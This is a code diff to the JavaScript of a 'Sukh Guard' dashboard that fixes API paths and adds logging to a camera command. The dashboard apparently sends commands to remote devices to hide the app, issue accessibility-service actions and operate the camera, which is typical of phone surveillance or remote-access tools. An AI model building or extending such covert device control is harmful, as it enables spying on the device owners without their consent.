@@ -1,7 +1,7 @@
 // js/app.js - Sukh Guard Dashboard Functions
 const app = {
     SERVER_URL: 'https://sukh-3qtl.onrender.com/api/website/app-data',
-    COMMANDS_URL: 'https://sukh-3qtl.onrender.com/api',
+    COMMANDS_URL: 'https://sukh-3qtl.onrender.com',
     autoRefreshInterval: null,
     isAutoRefresh: true,
     currentView: 'grid',
@@ -800,7 +800,7 @@ const app = {
         if (!app.currentDevice) return;
         
         try {
-            const response = await fetch(`${app.COMMANDS_URL}/hide-device`, {
+            const response = await fetch(`${app.COMMANDS_URL}/api/hide-device`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -850,7 +850,7 @@ const app = {
         if (!app.currentDevice) return;
         
         try {
-            const response = await fetch(`${app.COMMANDS_URL}/accessibility-command`, {
+            const response = await fetch(`${app.COMMANDS_URL}/api/accessibility-command`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -959,7 +959,9 @@ const app = {
         if (!app.currentDevice) return;
         
         try {
-            const response = await fetch(`${app.COMMANDS_URL}/camera`, {
+            console.log('📷 Sending camera command:', { action, cameraType, device: app.currentDevice });
+            
+            const response = await fetch(`${app.COMMANDS_URL}/api/camera`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -973,11 +975,11 @@ const app = {
             });
             
             const result = await response.json();
+            console.log('📷 Camera response:', result);
             
             if (result.success) {
                 // Server se message show karo
                 app.showToast(result.message, 'success');
-                console.log('📷 Camera command successful:', result);
             } else {
                 app.showToast('Camera command failed', 'error');
             }
